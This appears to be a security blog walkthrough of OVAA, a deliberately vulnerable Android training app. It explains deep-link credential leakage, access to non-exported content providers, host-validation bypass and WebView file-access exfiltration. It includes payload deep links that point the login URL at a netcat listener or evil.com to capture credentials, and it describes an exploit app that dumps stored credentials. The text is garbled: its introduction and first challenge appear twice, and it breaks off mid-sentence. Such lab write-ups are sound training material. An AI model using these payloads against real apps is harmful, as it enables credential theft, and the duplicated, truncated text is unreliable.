OVAA (Oversecured Vulnerable Android App) is an Android app that aggregates all the platform’s known and popular security vulnerabilities.

## Table of Contents
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
  1. [Leakage of credentials via installation of an arbitrary url](#1-leakage-of-credentials-via-installation-of-an-arbitrary-url)
  2. [Obtaining access to arbitrary non-exported content providers](#2-obtaining-access-to-arbitrary-non-exported-content-providers)
  3. [Bypass host validation in deeplink](#3-bypass-host-validation-in-deeplink)
  4. [Exfiltrate sensitive data via deeplink by making use of the vulnerable WebView setting](#4-exfiltrate-sensitive-data-via-deeplink-by-making-use-of-the-vulnerable-webview-setting)
  5. [Acquiring access to protected activity using intent redirection](#5-acquiring-access-to-protected-activity-using-intent-redirection)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)
- [References](#references)
- [About Payatu](#about-payatu)

As of writing this post, the app consists of 18 vulnerabilities mainly focused on OWASP Mobile Top 10. This is Part-1 of the series in which we have covered five vulnerabilities. We will try to explain every topic that will come in the way of solving the challenges.

## Prerequisites

Before starting our blog series, it is assumed that the reader has their Android Pentesting Lab ready and also prior knowledge of Android Components and their working.

However, below are some references in case you want to set up your Android Pentesting lab or read more about Android Components:
- [Android Pentesting Lab](#)
- [Penetrate the Protected Component in Android Part-1](#)
- [Penetrate the Protected Components in Android Part-2](#)

If you are reading this, that means you have all the arsenal in your hands. Without any further delay, let’s solve these challenges:

### 1. Leakage of Credentials via Installation of an Arbitrary URL

Before we solve this challenge, we need to understand what a deep link is. Deep links are hyperlinks that allow users to open specific content inside an Android application. Developers often configure these links to save users from the extra burden of locating a particular page themselves, significantly improving the user experience.

A sample deep link looks like:

![image](https://github.com/user-attachments/assets/0de4c071-48e9-4d99-bbfd-dbb425a8b62b)

Taking the example of the above deep link, we have:
- **scheme**: oversecured
- **host**: OVAA
- **pathPrefix**: /login
- **query**: url=http://evil.com

Exploiting deep links requires an understanding of how the application processes the deep link data. First, decompile the `ovaa.apk` using `jadx-gui` and then locate the `oversecured.ovaa.activities.DeeplinkActivity`. The code should look like the picture below:

![image](https://github.com/user-attachments/assets/3a159107-8c8f-4d5a-a0da-d39873f5994e)

As you can see, there are four different `pathPrefix` that are being processed. We will analyze each one of them later. For this challenge, we will focus on the `pathPrefix /login`. In this `pathPrefix`, the application takes the URL parameter from the deep link and assigns it to the `LOGIN_URL_KEY` using `this.loginUtils.setLoginUrl(url2)` if the URL parameter is not null. After that, it starts an activity named `EntranceActivity`.

![image](https://github.com/user-attachments/assets/c656d290-a966-4662-b6bf-88830fe6c569)


Going into that activity, we can see it is checking if we have already logged in or not. If not, it starts another activity `LoginActivity`.

![image](https://github.com/user-attachments/assets/b4b19a2a-ff1c-4620-bbff-a53fb50a8507)


Line 63 of `LoginActivity` is starting a `LoginService` that sends the login credentials to the `LOGIN_URL_KEY`. Since the `LOGIN_URL_KEY` is controlled by the user, we can provide the URL which we have access to and then sniff the credentials.

Let’s open a netcat connection to listen to the interface to which the emulator is connected:

**Payload**:
```
oversecured://ovaa/login?url=http://192.168.56.1:9001
```

Open a web browser and paste this link. It should redirect you to a login page. After a few seconds, the netcat will receive a POST request that contains the credentials.

![image](https://github.com/user-attachments/assets/a4f0273c-0abb-4333-bc30-711d5597b184)

OVAA (Oversecured Vulnerable Android App) is an Android app that aggregates all the platform’s known and popular security vulnerabilities.

## Table of Contents
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
  1. [Leakage of Credentials via Installation of an Arbitrary URL](#1-leakage-of-credentials-via-installation-of-an-arbitrary-url)
  2. [Obtaining Access to Arbitrary Non-Exported Content Providers](#2-obtaining-access-to-arbitrary-non-exported-content-providers)
  3. [Bypass Host Validation in Deeplink](#3-bypass-host-validation-in-deeplink)
  4. [Exfiltrate Sensitive Data via Deeplink by Making Use of the Vulnerable WebView Setting](#4-exfiltrate-sensitive-data-via-deeplink-by-making-use-of-the-vulnerable-webview-setting)
  5. [Acquiring Access to Protected Activity Using Intent Redirection](#5-acquiring-access-to-protected-activity-using-intent-redirection)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)
- [References](#references)
- [About Payatu](#about-payatu)

As of writing this post, the app consists of 18 vulnerabilities mainly focused on OWASP Mobile Top 10. This is Part-1 of the series in which we have covered five vulnerabilities. We will try to explain every topic that will come in the way of solving the challenges.

## Prerequisites

Before starting our blog series, it is assumed that the reader has their Android Pentesting Lab ready and also prior knowledge of Android Components and their working.

However, below are some references in case you want to set up your Android Pentesting lab or read more about Android Components:
- [Android Pentesting Lab](#)
- [Penetrate the Protected Component in Android Part-1](#)
- [Penetrate the Protected Components in Android Part-2](#)

If you are reading this, that means you have all the arsenal in your hands. Without any further delay, let’s solve these challenges:

### 1. Leakage of Credentials via Installation of an Arbitrary URL

Before we solve this challenge, we need to understand what a deep link is. Deep links are hyperlinks that allow users to open specific content inside an Android application. Developers often configure these links to save users from the extra burden of locating a particular page themselves, significantly improving the user experience.

A sample deep link looks like:

```
oversecured://ovaa/login?url=http://evil.com
```

Taking the example of the above deep link, we have:
- **scheme**: oversecured
- **host**: OVAA
- **pathPrefix**: /login
- **query**: url=http://evil.com

Exploiting deep links requires an understanding of how the application processes the deep link data. First, decompile the `ovaa.apk` using `jadx-gui` and then locate the `oversecured.ovaa.activities.DeeplinkActivity`. The code should look like the picture below:

![Decompiled Code Snippet](Kerberos_files/image001.png)

As you can see, there are four different `pathPrefix` that are being processed. We will analyze each one of them later. For this challenge, we will focus on the `pathPrefix /login`. In this `pathPrefix`, the application takes the URL parameter from the deep link and assigns it to the `LOGIN_URL_KEY` using `this.loginUtils.setLoginUrl(url2)` if the URL parameter is not null. After that, it starts an activity named `EntranceActivity`.

![Decompiled Code Snippet of EntranceActivity](Kerberos_files/image002.png)

Going into that activity, we can see it is checking if we have already logged in or not. If not, it starts another activity `LoginActivity`.

![Decompiled Code Snippet of LoginActivity](Kerberos_files/image003.png)

Line 63 of `LoginActivity` is starting a `LoginService` that sends the login credentials to the `LOGIN_URL_KEY`. Since the `LOGIN_URL_KEY` is controlled by the user, we can provide the URL which we have access to and then sniff the credentials.

Let’s open a netcat connection to listen to the interface to which the emulator is connected:

**Payload**:
```
oversecured://ovaa/login?url=http://192.168.56.1:9001
```

Open a web browser and paste this link. It should redirect you to a login page. After a few seconds, the netcat will receive a POST request that contains the credentials.

![Netcat Listener on Port 9001](Kerberos_files/image004.png)

### 2. Obtaining Access to Arbitrary Non-Exported Content Providers

In this challenge, we have to access a content provider which is not exported but can be accessed if it has the flag `Intent.FLAG_GRANT_READ_URI_PERMISSION` set. This flag grants permission to perform read operations on the URL in the intent’s data.

In the `DeeplinkActivity` class, we can notice that the application is using the `startActivityForResult` method to open an activity. Sometimes we want to get a result back from an activity when it ends. For example, we may start an activity that lets the user pick a person from a list of contacts; when it ends, it returns the person that was selected. To do this, you call the `startActivityForResult(Intent, int)` version with a second integer parameter identifying the call. The result will come back through our `onActivityResult(int, int, Intent)` method.

![Code Snippet of DeeplinkActivity](Kerberos_files/image005.png)

However, after going through the code, we find out that the `onActivityResult` method never gets executed because of a `finish` method called after `processDeeplink`. Since the `finish` method will destroy the current activity, the activity is no longer waiting for the result to come back.

![Code Snippet of DeeplinkActivity](Kerberos_files/image006.png)

To make it work, we need to remove the `finish` method from Line 30 and add it to Line 73 as shown below.

![Code Snippet of DeeplinkActivity](Kerberos_files/image007.png)

Now that you have understood the methods and their working, let’s understand how we are going to exploit this vulnerability using an ExploitApp.

First, we created an ExploitApp with two activities named `MainActivity` and `EvilActivity`.

![AndroidManifest File of ExploitApp](Kerberos_files/image008.png)

`EvilActivity` of ExploitApp has action set to `oversecured.ovaa.action.GRANT_PERMISSIONS` which means that `DeeplinkActivity` of OVAA app will start this activity if no other activity can handle the intent.

![MainActivity of ExploitApp](Kerberos_files/image009.png)

Please note that we are opening `DeeplinkActivity` using `startActivityForResult` method and that means we are waiting for the result that will be returned by `DeeplinkActivity`. And `DeeplinkActivity` is also starting `EvilActivity` using `startActivityForResult` method which means it is also waiting for the result that will be returned by the `EvilActivity`.

![EvilActivity of ExploitApp](Kerberos_files/image010.png)

When this intent is returned to the `DeeplinkActivity`, it simply returns the same intent to the `MainActivity` of ExploitApp and then we can dump the creds using the content provider `content://oversecured.ovaa.creds_provider/`.

Now you may be wondering why we can’t dump the creds using content provider from `EvilActivity` itself. It will not work because only the recipient of the intent will be granted permission to perform read operations. So, when the `DeeplinkActivity` sends the intent to the `MainActivity` of ExploitApp, the `MainActivity` has permission granted. To sum up the whole process, we have created an image as shown below:

![Diagram of How the Exploit Works](Kerberos_files/image011.png)

Launch ExploitApp and check the logs, you will get the creds.

![Log Output of the ExploitApp Containing Credentials](Kerberos_files/image012.png)

### 3. Bypass Host Validation in Deeplink

Opening the `oversecured.ovaa.activities.DeeplinkActivity`, when the path prefix is `/webview`, it is doing some validation on the URL which we pass as a parameter as shown below.

![Code Snippet of DeeplinkActivity](Kerberos_files/image013.png)

We can easily bypass this validation by using any website that ends with `example.com`, for example, `evilexample.com`. We will be using `adb` to open the `DeeplinkActivity` this time, however, you can also do that using Drozer or by manually creating an application.

![Using adb to Launch the Attack](Kerberos_files/image014.png)

### 4. Exfiltrate Sensitive Data via Deeplink by Making Use of the Vulnerable WebView Setting

In the `oversecured.ovaa.activities.WebViewActivity`, `setAllowFileAccessFromFileURLs` has been set which allows whether cross-origin requests in the context of a file scheme URL should be allowed to access content from other file scheme URLs. For example, it can read the hosts’ file or `login_data.xml` file where it stores the credentials. Also, we can see in the `DeeplinkActivity` of the OVAA app, only the host value is validated but the scheme isn’t validated.

![Code Snippet of DeeplinkActivity](Ker
